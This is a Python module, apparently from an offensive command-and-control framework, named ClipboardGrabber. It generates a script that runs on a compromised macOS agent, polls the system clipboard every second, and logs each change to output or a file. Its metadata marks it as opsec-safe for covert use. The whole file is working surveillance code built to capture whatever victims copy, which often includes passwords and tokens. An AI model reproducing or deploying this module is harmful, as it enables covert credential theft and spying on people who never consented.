class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'ClipboardGrabber',

            # list of one or more authors for the module
            'Author': ['@424f424f'],

            # more verbose multi-line description of the module
            'Description': 'This module will write log output of clipboard to stdout (or disk).',

            # True if the module needs to run in the background
            'Background': False,

            # File extension to save the file as
            'OutputExtension': "",

            # if the module needs administrative privileges
            'NeedsAdmin': False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe': True,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': ['']
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent': {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to grab clipboard from.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'OutFile': {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Optional file to save the clipboard output to.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'MonitorTime': {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Optional for how long you would like to monitor clipboard in (s).',
                'Required'      :   True,
                'Value'         :   '0'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        outFile = self.options['OutFile']['Value']
        monitorTime = self.options['MonitorTime']['Value']

        # the Python script itself, with the command to invoke
        #   for execution appended to the end. Scripts should output
        #   everything to the pipeline for proper parsing.
        #
        # the script should be stripped of comments, with a link to any
        #   original reference script included in the comments.
        script = """
def func(monitortime=0):
    from AppKit import NSPasteboard, NSStringPboardType
    import time
    import datetime
    import sys

    sleeptime = 0
    last = ''
    outFile = '%s'

    while sleeptime <= monitortime:
        try:
            pb = NSPasteboard.generalPasteboard()
            pbstring = pb.stringForType_(NSStringPboardType)

            if pbstring != last:
                if outFile != "":
                    f = file(outFile, 'a+')
                    f.write(pbstring)
                    f.close()
                    print "clipboard written to",outFile
                else:
                    ts = time.time()
                    st = datetime.datetime.fromtimestamp(ts).strftime('%%Y-%%m-%%d %%H:%%M:%%S')
                    print st + ": %%s".encode("utf-8") %% repr(pbstring)
            last = pbstring
            time.sleep(1)
            sleeptime += 1
        except Exception as e:
            print e

func(monitortime=%s)""" % (outFile,monitorTime)

        return script
